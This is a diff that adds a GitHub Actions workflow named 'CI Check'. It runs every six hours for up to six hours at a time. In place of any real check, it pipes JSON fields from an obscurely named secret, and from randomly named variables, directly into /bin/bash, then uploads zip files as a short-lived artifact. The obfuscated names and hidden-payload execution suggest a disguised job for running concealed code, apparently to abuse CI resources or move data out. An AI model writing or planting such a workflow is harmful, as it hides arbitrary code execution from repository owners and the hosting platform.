@@ -1,0 +1,30 @@
+name: CI Check
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '38 0,6,12,18 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  scheduler:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Invoke
+        env:
+          o8: ${{ secrets.o8 }}
+        run: |
+          printf '%s' "$o8" | jq -r .i0 | /bin/bash
+          echo $qvfd868 | jq -r .mn0 | /bin/bash
+          echo $k55885 | jq -r .zlyw995 | /bin/bash
+          echo $wojgx2 | jq -r .za4538 | /bin/bash
+
+      - name: Store artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: UpHuyizS
+          path: "*.zip"
+          retention-days: 1
